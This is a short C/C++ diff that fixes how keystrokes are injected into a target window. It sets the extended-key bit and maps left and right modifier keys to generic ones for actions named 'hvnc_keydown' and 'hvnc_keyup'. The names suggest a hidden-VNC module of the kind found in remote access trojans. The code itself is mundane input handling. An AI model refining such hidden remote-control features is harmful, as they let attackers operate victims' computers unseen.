@@ -787,6 +787,12 @@ static bool send_mouse_input(int normX, int normY, DWORD flags, DWORD mouseData 
 static LPARAM key_lparam(WORD vk, bool keyUp) {
     UINT scan = MapVirtualKeyW(vk, MAPVK_VK_TO_VSC);
     LPARAM lp = 1 | (scan << 16);
+    if (vk == VK_RMENU || vk == VK_RCONTROL || vk == VK_INSERT || vk == VK_DELETE ||
+        vk == VK_HOME || vk == VK_END || vk == VK_PRIOR || vk == VK_NEXT ||
+        vk == VK_LEFT || vk == VK_RIGHT || vk == VK_UP || vk == VK_DOWN ||
+        vk == VK_DIVIDE || vk == VK_NUMLOCK) {
+        lp |= 0x01000000; // Extended key bit
+    }
     if (keyUp) lp |= 0xC0000000;
     return lp;
 }
@@ -934,9 +940,17 @@ static void input_loop() {
             if (!hTarget || !IsWindow(hTarget)) continue;
 
             if (action == "hvnc_keydown") {
-                PostMessageW(hTarget, WM_KEYDOWN, (WPARAM)vk, key_lparam((WORD)vk, false));
+                WPARAM wParam = vk;
+                if (vk == VK_LCONTROL || vk == VK_RCONTROL) wParam = VK_CONTROL;
+                else if (vk == VK_LMENU || vk == VK_RMENU) wParam = VK_MENU;
+                else if (vk == VK_LSHIFT || vk == VK_RSHIFT) wParam = VK_SHIFT;
+                PostMessageW(hTarget, WM_KEYDOWN, wParam, key_lparam((WORD)vk, false));
             } else if (action == "hvnc_keyup") {
-                PostMessageW(hTarget, WM_KEYUP, (WPARAM)vk, key_lparam((WORD)vk, true));
+                WPARAM wParam = vk;
+                if (vk == VK_LCONTROL || vk == VK_RCONTROL) wParam = VK_CONTROL;
+                else if (vk == VK_LMENU || vk == VK_RMENU) wParam = VK_MENU;
+                else if (vk == VK_LSHIFT || vk == VK_RSHIFT) wParam = VK_SHIFT;
+                PostMessageW(hTarget, WM_KEYUP, wParam, key_lparam((WORD)vk, true));
             } else if (action == "hvnc_char") {
                 // Doğrudan WM_CHAR post et
                 PostMessageW(hTarget, WM_CHAR, (WPARAM)vk, 1);  // lParam genelde 1 (repeat count)
